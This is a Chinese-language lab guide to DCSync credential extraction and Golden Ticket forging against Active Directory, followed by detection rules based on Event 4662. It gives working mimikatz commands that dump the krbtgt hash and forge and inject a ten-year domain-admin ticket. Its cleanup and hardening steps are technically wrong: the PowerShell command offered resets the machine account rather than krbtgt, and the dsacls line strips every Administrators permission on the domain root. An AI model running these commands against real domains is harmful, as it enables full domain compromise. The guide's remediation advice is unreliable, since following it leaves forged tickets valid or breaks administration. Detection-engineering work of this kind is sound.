# DCSync 攻擊與 Golden Ticket 驗證指南

## 概述

DCSync（Domain Controller Synchronization）是一種針對Active Directory的攻擊技術，攻擊者模擬域控制器之間的複寫行為，提取敏感帳號的NT Hash（特別是krbtgt帳號）。取得krbtgt Hash後，攻擊者可偽造Golden Ticket，實現對整個AD域的完全控制與持久化訪問。

## 技術背景與攻擊原理

### 核心機制
- **協定層**: DRSUAPI (Directory Replication Service API) over RPC/TCP
- **權限要求**: 
  - `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
  - `DS-Replication-Get-Changes-All` (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- **攻擊目標**: 提取krbtgt帳號的NT Hash，用於Golden Ticket偽造

### ⚠️ 重要發現：Mimikatz 的隱蔽特性

在真實環境與Lab測試中證實，Mimikatz的 `lsadump::dcsync` 實作方式具有高度隱蔽性：

| 特徵 | 完整 DC 複寫 | Mimikatz DCSync |
|------|--------------|-----------------|
| **複寫行為** | 建立完整的複寫工作階段 | 僅發送單次 GetNCChanges 請求 |
| **Event 4928/4929** | ✅ 會觸發 (開始/結束) | ❌ **不會觸發** (繞過工作階段建立) |
| **Event 4662** | ✅ 會觸發 (物件存取) | ✅ **會觸發** (唯一可靠指標) |

**結論：Event 4662 + 複寫 GUID 是 DCSync 唯一且最可靠的偵測依據。依賴 4928/4929 會導致漏報。**

## 前置準備

### 環境要求
- ✅ Windows Server Domain Controller
- ✅ 隔離的Lab測試環境
- ✅ 具有Domain Admin權限的測試帳號
- ✅ mimikatz工具

### 權限驗證
```powershell
# 確認當前域環境
echo %USERDOMAIN%
systeminfo | findstr /C:"Domain"

# 檢查複寫權限 (通常 Administrators 組預設擁有)
dsacls "DC=sme,DC=local" | findstr /C:"Replication"
```

### 稽核設定確認
為確保 Event 4662 能被記錄，必須啟用 `Directory Service Access` 稽核：

```cmd
# 檢查稽核設定
auditpol /get /subcategory:"Directory Service Access"

# 若未啟用，執行以下命令：
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
```

## 攻擊執行步驟

### 階段 1: 執行 DCSync 提取 Hash
```cmd
# 啟動mimikatz
mimikatz.exe

# 提升權限並執行 DCSync 提取 krbtgt
privilege::debug
lsadump::dcsync /domain:sme.local /user:krbtgt
```

**成功指標**：輸出中包含 `Object RDN: krbtgt` 及其 `Hash NTLM`。

### 階段 2: 偽造 Golden Ticket (權限維持)
取得 krbtgt Hash 後，可偽造黃金票證（Golden Ticket）：

```cmd
# 偽造 Golden Ticket 並注入記憶體 (有效期 10 年)
kerberos::golden /user:Administrator /domain:sme.local /sid:<Domain_SID> /krbtgt:<NTLM_Hash> /id:500 /endin:5256000 /ptt

# 範例：
# kerberos::golden /user:Administrator /domain:sme.local /sid:S-1-5-21-xxx /krbtgt:1ab139fa... /id:500 /endin:5256000 /ptt
```

### 階段 3: 驗證攻擊效果
```cmd
# 驗證票證是否生效
klist

# 測試域管理權限 (列出 DC 的 C 碟)
dir \\<DC_Hostname>\c$
```

## 關鍵 Event ID 分析與偵測

### ✅ Event 4662 - 物件存取審核 (核心證據)
這是 DCSync 攻擊的**決定性證據**。

```xml
<EventID>4662</EventID>
<SubjectUserName>攻擊者帳號 (如: aduser)</SubjectUserName>
<ObjectDN>DC=sme,DC=local</ObjectDN>
<AccessMask>0x100</AccessMask> <!-- Control Access -->
<Properties>
  <!-- 關鍵複寫 GUID -->
  1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
</Properties>
```

### ❌ 常見誤區：不會觸發的 Event
- **Event 4928/4929**: Mimikatz 不建立完整複寫 Session，通常不觸發。
- **Event 5136**: DCSync 是讀取操作，不修改物件，故不觸發。
- **Event 4670**: DCSync 利用現有權限，不修改權限設定。
- **Event 4769**: DCSync 使用 RPC 協定，不涉及 Kerberos TGS 請求。

## EDR 偵測策略建議

### 1. 基於 Event 4662 的精準偵測
EDR 應建立規則偵測以下條件同時滿足：
- **Event ID**: 4662
- **Properties 包含**: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` 或 `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- **SubjectUserName**: **非** 機器帳號 (以 `$` 結尾) 或 已知 DC 帳號

### 2. 行為分析
- **來源主機異常**: 監控從**非域控制器** IP 發起的 DRSUAPI 流量。
- **Golden Ticket 使用**: 監控 Event 4624 (登入) 或 4769 (服務票證)，特徵為異常長的票證有效期或來自不存在的使用者。

## 取證與分析指令

### 提取關鍵安全日誌
```powershell
# 提取包含複寫 GUID 的 4662 事件
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662]]" | Where-Object { $_.Properties[2].Value -match "1131f6ad|1131f6aa" } | Select-Object TimeCreated, @{N="User";E={$_.Properties[0].Value}}, @{N="Object";E={$_.Properties[1].Value}}
```

### 檢查帳號複寫權限
```powershell
Import-Module ActiveDirectory
$domainDN = (Get-ADDomain).DistinguishedName
$acl = Get-ACL "AD:\$domainDN"
$acl.Access | Where-Object { 
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or 
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
} | Format-Table IdentityReference, AccessControlType, ActiveDirectoryRights
```

## 安全加固與清理

### 1. 權限最小化 (最有效防護)
移除一般管理者 (如 Administrators 群組) 的複寫權限，僅授權給特定 DC 電腦帳號。

```powershell
# 移除 Administrators 的複寫權限
dsacls "DC=sme,DC=local" /R "BUILTIN\Administrators"
```

### 2. 測試後清理
- 重置 krbtgt 帳號密碼 (這會使所有偽造的 Golden Ticket 失效)：
  ```powershell
  # 建議執行兩次，以清除歷史密碼 Hash
  Reset-ComputerMachinePassword
  ```
- 刪除測試用的 Golden Ticket (重啟或執行 `klist purge`)。

---

**重要提醒**: 僅在完全隔離的 Lab 環境執行此測試。Golden Ticket 具有極高的危險性，測試後務必執行 krbtgt 密碼重置以確保環境安全。
